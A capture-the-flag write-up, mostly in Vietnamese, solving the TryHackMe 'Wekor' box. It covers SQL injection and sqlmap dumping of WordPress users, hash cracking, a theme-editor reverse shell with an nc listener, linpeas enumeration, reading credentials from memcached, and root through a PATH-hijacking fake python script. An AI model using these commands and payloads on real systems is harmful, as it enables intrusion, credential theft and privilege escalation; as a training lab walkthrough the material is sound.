# Wekor-Tryhackme

Hey Everyone! This Box is just a little CTF I've prepared recently. I hope you enjoy it as it is my first time ever creating something like this !

This CTF is focused primarily on enumeration, better understanding of services and thinking out of the box for some parts of this machine.

Feel free to ask any questions...It's okay to be confused in some parts of the box ;)

Just a quick note, Please use the domain : "wekor.thm" as it could be useful later on in the box ;)

sudo nano /etc/hosts

10.201.93.94    wekor.thm

recon

<img width="1047" height="367" alt="image" src="https://github.com/user-attachments/assets/fe2b96fd-a1ed-494e-b0f7-3da03a85f59f" />

<img width="673" height="425" alt="image" src="https://github.com/user-attachments/assets/5fcfdcbf-d382-4351-818e-5449a747e078" />

<img width="560" height="396" alt="image" src="https://github.com/user-attachments/assets/6b2f4990-92b5-4669-b951-afba5666a0fb" />

thư mục /comingreallysoon có nội dung 

<img width="1207" height="392" alt="image" src="https://github.com/user-attachments/assets/afa08e86-ef8f-426d-8f85-2e36368fb0c4" />

chuyển hướng đến http://wekor.thm/it-next/

<img width="1278" height="746" alt="image" src="https://github.com/user-attachments/assets/e959bb12-436b-4046-b329-f8f3b8480476" />

tôi bắt đầu tìm kiếm xem trang web có gì . Tôi thử truy cập vào http://wekor.thm/it-next/it_shop_detail.php và nhấp vào "Add to card", chúng ta sẽ thấy một số thông tin đầu vào với nội dung "Apply to Coupon" trên http://wekor.thm/it-next/it_cart.php 
Tôi đã thử một số mã độc SQL injection '1 OR 1=1 -- và nhấp vào "Apply to Coupon" dẫn đến thông báo lỗi

<img width="1268" height="758" alt="image" src="https://github.com/user-attachments/assets/2edb3363-529a-4119-a7e8-679323237ffd" />

để xem trang web có dễ bị tấn công SQLi hay không tôi dùng burp suite ghi lại yêu cầu POST với tệp sql.txt và sử dụng sqlmap -r sql.txt --dbs

<img width="1196" height="532" alt="image" src="https://github.com/user-attachments/assets/15ea34bb-adb7-4a9c-be26-16cda7271b80" />

xác nhận lỗ hổng SQLi và kết quả thu được là 6 databases

<img width="1262" height="440" alt="image" src="https://github.com/user-attachments/assets/e54ce870-68c3-4394-9c8e-45da991360ea" />

tiếp theo tôi kiểm tra database wordpress

sqlmap -r sql.txt -p coupon_code --batch --dbms=mysql -D wordpress --tables

<img width="1008" height="649" alt="image" src="https://github.com/user-attachments/assets/24fa07e8-541f-487b-a0fe-a9b8791d49d9" />

kết quả ra được 12 bảng trong wordpress

tiếp tục kiểm tra bảng wp_users

qlmap -r sql.txt -D wordpress -T wp_users --dump

<img width="1283" height="495" alt="image" src="https://github.com/user-attachments/assets/09b95008-db6b-4fed-9c44-27d493259168" />

Có 4 user trong wp_users (ID 1, 5743, 5773, 5873).

Cột user_pass chứa các giá trị bắt đầu bằng $P$... → đó là portable phpass (WordPress default) — John hỗ trợ định dạng này.

User đầu tiên là admin (user_login = admin) — đây sẽ là mục tiêu hàng đầu.

Các user khác là wp_jeffrey, wp_yura, wp_eagle.

và có 1 subdomain mới http://site.wekor.thm/wordpress

bước tiếp theo tôi sẽ cấu hình subdomain đó 

sudo nano /etc/hosts

10.201.93.94    wekor.thm       site.wekor.thm

<img width="1283" height="751" alt="image" src="https://github.com/user-attachments/assets/c8f48180-30c7-4ea1-9331-2dab97c5781d" />

dò thư mục 

gobuster dir -u http://site.wekor.thm/wordpress -w /usr/share/wordlists/dirb/common.txt

<img width="913" height="555" alt="image" src="https://github.com/user-attachments/assets/17a5e20b-496f-4598-9675-0f0068cb5d95" />

kiểm tra http://site.wekor.thm/wordpress/wp-admin/

<img width="1265" height="753" alt="image" src="https://github.com/user-attachments/assets/1d502d1d-811c-4e92-be63-e5f60d765c50" />

ta đã có 4 người dùng bây giờ tôi sẽ giải hash

<img width="856" height="370" alt="image" src="https://github.com/user-attachments/assets/73b02f4a-f4e6-40ff-9676-ee1f7c879fef" />

kết quả :
rockyou          (wp_jeffrey)     
xxxxxx           (wp_eagle)     
soccer13         (wp_yura)    

login wp_yura:soccer13

<img width="1265" height="758" alt="image" src="https://github.com/user-attachments/assets/75482ba0-1e76-4f2e-8666-5644a692a0a3" />

wow 1 trang admin

chuẩn bị reverse 

Appearance > Theme Editor > Theme files

<img width="1265" height="647" alt="image" src="https://github.com/user-attachments/assets/687c80c5-c96e-4dc2-bf63-fa7048b815fc" />

bây giờ khởi động trình lắng nghe nc trên port 1234 sau đó điều hướng đến http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php

và chúng ta đã có được shell 

<img width="930" height="337" alt="image" src="https://github.com/user-attachments/assets/39a692ce-7629-4479-920d-014d7d535866" />

Khởi động một máy chủ HTTP để lưu trữ 'linpeas.sh'

<img width="752" height="566" alt="image" src="https://github.com/user-attachments/assets/97140d17-a16e-493a-bf60-f0d364e8b17e" />

sau đó từ máy mục tiêu tải linpeas.sh 

<img width="795" height="368" alt="image" src="https://github.com/user-attachments/assets/22b8e100-c184-4d25-81b2-d9e0b34f9c7e" />

sau đó khởi động ./linpeas.sh

<img width="1260" height="698" alt="image" src="https://github.com/user-attachments/assets/3c584ba1-961c-4f24-bf0a-7edbdc3477d3" />

Kết nối với dịch vụ memcached qua Telnet

chuỗi lệnh :

stats slabs

get username

get password

<img width="651" height="651" alt="image" src="https://github.com/user-attachments/assets/5e3c55e1-6ddb-4c75-9b59-c931381f3122" />

và tôi đã có pass : OrkAiSC00L24/7$

<img width="860" height="522" alt="image" src="https://github.com/user-attachments/assets/705731c6-065b-4e0f-b2c3-a6f34b85cd1d" />

đã có cờ đầu tiên 

<img width="725" height="501" alt="image" src="https://github.com/user-attachments/assets/01bdc859-1cb4-4a49-9bc2-91a81a01fdc2" />

User Orka có quyền chạy /home/Orka/Desktop/bitcoin bằng sudo. Binary bitcoin gọi script Python (transfer.py) bằng tên python (không dùng đường dẫn tuyệt đối). Nếu ta chèn một file thực thi tên python ở vị trí xuất hiện trước trong PATH, khi bitcoin gọi python sẽ chạy file của ta — từ đó có thể mở shell root. 

Kiểm tra những gì user có thể chạy bằng sudo:

sudo -l

Xem thư mục chứa chương trình và nội dung script kèm theo:

ls -la /home/Orka/Desktop

cat /home/Orka/Desktop/transfer.py

file /home/Orka/Desktop/bitcoin

strings /home/Orka/Desktop/bitcoin | sed -n '1,200p'

File transfer.py có đoạn quan trọng:

result = sys.argv[1]

print "Saving " + result + " BitCoin(s) For Later Use "

test = raw_input("Do you want to make a transfer? Y/N : ")

if test == "Y":

Điều này gợi ý bitcoin gọi Python để chạy transfer.py.

Kiểm tra PATH:

echo $PATH
ls -la /usr/sbin   # kiểm tra xem bạn có quyền ghi ở đây không

Tạo một file python giả (trong ví dụ ta đặt ở /usr/sbin) để khi được chạy sẽ mở shell:

cd /usr/sbin

echo -e '#!/bin/bash\n/bin/bash' > python

chmod +x python

ls -l /usr/sbin/python

hạy binary được phép bởi sudo:

sudo /home/Orka/Desktop/bitcoin

Xác minh đã lên root:

whoami    # output: root

id

ls /root

cat /root/root.txt

<img width="712" height="540" alt="image" src="https://github.com/user-attachments/assets/f28b23d4-cf3e-4dda-8ad4-90643cde8071" />
